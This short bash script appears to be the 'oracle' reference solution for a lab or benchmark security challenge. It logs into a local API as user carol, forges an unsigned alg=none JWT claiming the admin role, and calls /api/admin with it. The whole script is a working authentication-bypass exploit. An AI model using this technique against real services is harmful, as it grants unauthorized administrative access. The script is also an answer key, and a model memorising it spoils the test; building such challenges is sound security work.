#!/usr/bin/env bash
# Oracle: login as carol, forge an alg=none admin token, hit /api/admin.
set -euo pipefail
TOK=$(curl -s -X POST http://api:8080/api/login -d '{"user":"carol","pass":"Password123"}' | jq -r .token)
echo "user token: $TOK"
FORGED=$(python3 - <<'EOF'
import base64, json
def b64e(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
h = b64e(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = b64e(json.dumps({"user":"admin","role":"admin","iat":1,"exp":9999999999}).encode())
print(f"{h}.{p}.")
EOF
)
curl -s http://api:8080/api/admin -H "Authorization: Bearer $FORGED"
